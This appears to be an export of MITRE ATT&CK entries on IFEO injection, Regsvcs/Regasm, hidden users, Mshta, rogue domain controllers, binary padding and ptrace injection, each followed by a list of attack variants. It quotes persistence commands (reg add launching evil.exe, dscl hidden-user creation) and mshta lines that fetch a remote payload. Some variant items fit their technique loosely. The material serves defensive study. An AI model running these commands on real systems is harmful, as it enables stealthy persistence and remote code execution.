      Image File Execution Options Injection: Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)  IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)  IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)  An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)  * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code> * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code> * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>  Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.  Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)
        ~Debugger Registry Modification: Direct modification of IFEO registry values to attach malicious debuggers to legitimate applications
        ~GFlags Tool Abuse: Using the GFlags tool to configure IFEO settings for target applications
        ~Silent Process Exit Monitoring: Configuring silent process exit monitoring to execute malicious code when monitored processes terminate
        ~System Application Redirection: Registering invalid debuggers to redirect and disable security applications
        ~Security Software Targeting: Specifically targeting antivirus and security tools through IFEO manipulation
        ~Persistence Through Monitor Process: Using MonitorProcess registry values for persistent code execution
        ~Cross-Architecture IFEO: Exploiting Wow6432Node for cross-architecture IFEO manipulation
      Regsvcs/Regasm: Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)  Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)
        ~ComRegisterFunction Attribute Abuse: Exploiting the ComRegisterFunction attribute to execute malicious code during assembly registration
        ~ComUnregisterFunction Attribute Abuse: Using the ComUnregisterFunction attribute to trigger code execution during assembly unregistration
        ~Assembly Loading via Network Share: Loading malicious assemblies from remote network locations for registration
        ~In-Memory Assembly Execution: Loading and executing assemblies directly in memory without touching disk
        ~COM Hijacking: Replacing legitimate COM registrations with malicious ones using Regsvcs/Regasm
        ~Privilege Escalation via COM: Exploiting COM registration to gain elevated privileges
        ~Registry Manipulation: Modifying registry entries during registration process for persistence
        ~DLL Side-Loading: Using Regsvcs/Regasm to load malicious DLLs alongside legitimate ones
      Hidden Users: Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> (Citation: Cybereason OSX Pirrit).
        ~Local System Hidden Users - Using built-in OS mechanisms to hide user accounts from login screens and user listings
        ~Domain Hidden Users - Manipulating Active Directory attributes to conceal domain user accounts
        ~Registry-based User Hiding - Modifying Windows registry settings to hide user accounts from enumeration
        ~Shadow User Accounts - Creating accounts that mirror legitimate user properties but remain concealed
        ~Service Account Masquerading - Disguising malicious user accounts as legitimate service accounts
        ~Hidden Administrator Accounts - Creating and hiding accounts with administrative privileges
        ~Group Policy Hidden Users - Using Group Policy settings to hide user accounts across domains
        ~Shell User Hiding - Manipulating shell configurations to hide users from command-line enumeration
        ~GUI-based User Hiding - Modifying graphical interface settings to conceal user accounts
        ~Cloud Platform Hidden Users - Concealing user accounts in cloud identity and access management systems
        ~Temporary User Accounts - Creating accounts that auto-delete after a specified time to avoid detection
        ~Nested Group Hiding - Concealing users through complex group membership structures
        ~File System ACL Manipulation - Using access control lists to hide user presence from directory services
        ~Symbolic Link User Masking - Using symbolic links to mask user home directories and profiles
        ~Container User Hiding - Concealing user accounts within containerized environments
        ~Virtual Machine User Isolation - Hiding users through VM isolation and snapshot manipulation
        ~Cross-Forest Hidden Users - Concealing users through complex forest trust relationships
        ~System Account Impersonation - Disguising malicious accounts as built-in system accounts
        ~Database User Masking - Hiding user accounts within database management systems and applications
        ~LDAP Attribute Manipulation - Modifying LDAP attributes to conceal user entries
        ~Kerberos Ticket Manipulation - Hiding user activity through Kerberos ticket manipulation
        ~Embedded System User Hiding - Concealing users on IoT and embedded devices
        ~Distributed System User Obfuscation - Hiding users across distributed system components
      Mshta: Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)  Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)   Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
        ~Direct URL Execution: Execute malicious HTA files directly from remote URLs, bypassing download restrictions
        ~Inline Script Execution: Use inline VBScript or JScript within mshta.exe command line
        ~Local File Execution: Execute locally stored HTA files to evade network detection
        ~COM Object Abuse: Leverage COM objects through mshta.exe to execute malicious code
        ~Registry Integration: Execute HTA content stored in registry to evade file-based detection
        ~Memory-Only Execution: Load and execute HTA content directly in memory without touching disk
        ~Proxy Execution: Use mshta.exe to proxy execution through other trusted Windows utilities
        ~Alternative Stream Execution: Execute HTAs stored in alternate data streams
        ~Command-Line Argument Abuse: Manipulate command-line arguments to bypass security controls
        ~Network Share Execution: Execute HTAs from network shares to evade local file monitoring
        ~Environment Variable Abuse: Use environment variables to obscure mshta.exe execution paths
        ~Parent Process Spoofing: Launch mshta.exe from unexpected parent processes to avoid detection
        ~DLL Search Order Hijacking: Exploit mshta.exe DLL loading behavior
        ~Application Compatibility Shims: Use shims to modify mshta.exe behavior
        ~Custom Protocol Handlers: Register and abuse custom protocol handlers with mshta.exe
        ~Script Host Delegation: Delegate execution to alternative script hosts through mshta.exe
        ~Zone.Identifier Bypass: Exploit mark-of-the-web bypass mechanisms
        ~Certificate Trust Abuse: Exploit certificate trust relationships in mshta.exe
        ~Event Log Bypass: Manipulate mshta.exe execution to avoid Windows Event Log entries
        ~AppLocker Policy Bypass: Exploit specific AppLocker policy weaknesses with mshta.exe
        ~UAC Bypass: Use mshta.exe to bypass User Account Control restrictions
        ~Protected View Bypass: Exploit Office Protected View escape mechanisms using mshta.exe
        ~Sandbox Escape: Use mshta.exe to break out of application sandboxes
      Rogue Domain Controller: Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.  Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)  This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)
        ~DCShadow Attack: Using Mimikatz to register a temporary rogue DC that replicates malicious changes while avoiding standard DC security monitoring
        ~Inactive DC Reuse: Leveraging dormant or decommissioned DC registrations to establish rogue control while minimizing new object creation
        ~Schema Manipulation: Specifically modifying AD schema objects through rogue DC to create persistence mechanisms
        ~Replication Metadata Tampering: Manipulating replication metadata to hide malicious changes and impede forensic analysis
        ~Privileged Account Manipulation: Using rogue DC capabilities to modify privileged account attributes and permissions
        ~Cross-Domain Replication: Exploiting trust relationships to replicate malicious changes across domain boundaries
        ~SYSVOL Abuse: Leveraging rogue DC status to manipulate SYSVOL contents and Group Policy Objects
        ~Certificate Template Abuse: Using rogue DC privileges to manipulate certificate templates and authentication mechanisms
        ~Backup Credential Abuse: Exploiting DC backup credentials and VSS snapshots to establish rogue DC capabilities
        ~Domain Controller Spoofing: Impersonating legitimate DC behavior through network protocol manipulation
        ~Selective Replication: Controlling which AD changes are replicated to avoid detection while maintaining desired malicious modifications
        ~RODC Exploitation: Abusing Read-Only Domain Controller mechanisms to establish rogue DC presence
        ~Site Configuration Manipulation: Modifying AD site topology and replication paths to facilitate rogue DC operations
        ~DNS Record Manipulation: Exploiting DC DNS records and service location mechanisms to redirect authentication traffic
        ~Domain Controller Cloning: Duplicating existing DC configurations to establish rogue presence while appearing legitimate
        ~Partial Attribute Set Replication: Manipulating attribute-level replication to selectively modify AD objects
        ~Trust Key Manipulation: Exploiting domain trust key mechanisms to extend rogue DC influence
        ~Schema Cache Poisoning: Manipulating schema cache to affect how domain controllers process object modifications
        ~Tombstone Manipulation: Exploiting deleted object retention mechanisms to hide malicious DC activities
        ~Global Catalog Abuse: Manipulating global catalog partial attribute sets to affect multi-domain environments
        ~Flexible Single Master Operations (FSMO) Role Abuse: Exploiting domain-wide operational roles
        ~USN Rollback: Manipulating Update Sequence Numbers to force unauthorized replication
        ~Application Directory Partition Abuse: Exploiting specialized directory partitions for persistence
      Binary Padding: Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary. This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.  Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)
        ~Append Junk Data: Adding meaningless data to the end of the binary file
        ~Section Padding: Inserting padding between executable sections
        ~Resource Padding: Adding fake resources or large media files
        ~Structured Padding: Adding well-formed but unused code or data structures
        ~Zero Padding: Using null bytes as padding material
        ~Random Data Padding: Using randomly generated bytes as padding
        ~Code Cave Injection with Padding: Creating large code caves filled with junk data
        ~Multi-Layer Padding: Applying multiple layers of different padding techniques
        ~Dynamic Size Padding: Implementing variable-size padding based on target environment
        ~Anti-Analysis Padding: Adding specifically crafted padding to break analysis tools
        ~Header Padding: Modifying file headers with extra padding data while maintaining validity
        ~Import Table Padding: Adding unnecessary imports and related padding
        ~Cross-Platform Padding: Implementing padding techniques specific to different OS formats
        ~Compression-Aware Padding: Adding padding that resists compression analysis
        ~Polymorphic Padding: Implementing self-modifying padding routines
      Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.   There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.   More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.
        Ptrace System Calls: Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.   Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018)   Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject)   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.
          Use custom code to attach to target process with PTRACE_ATTACH and inject shellcode into process memory using PTRACE_POKETEXT
          Implement memory allocation in target process by injecting calls to mmap() via PTRACE_SETREGS
          Use GDB with custom scripts to manipulate target process memory and registers through ptrace
          Create debugging tool that uses PTRACE_SINGLESTEP to control execution flow of target process
          Inject shared library loading code using ptrace to force target to load malicious .so files
          Use ptrace to modify GOT/PLT entries in target process for function hooking
          Implement syscall hijacking through ptrace by modifying process registers during syscall entry
          Create memory backdoor by injecting a persistent thread using ptrace and clone() syscall
          Use ptrace to inject code into standard system services for persistence
          Implement process hollowing technique using ptrace to replace process memory contents
          Use PTRACE_GETREGS and PTRACE_SETREGS to save and restore register state for stealthy execution
          Implement multi-stage injection by chaining multiple ptrace calls with small code chunks
          Use ptrace to modify process environment variables and LD_PRELOAD settings
          Create ptrace-based debugger detection bypass by manipulating TracerPid value
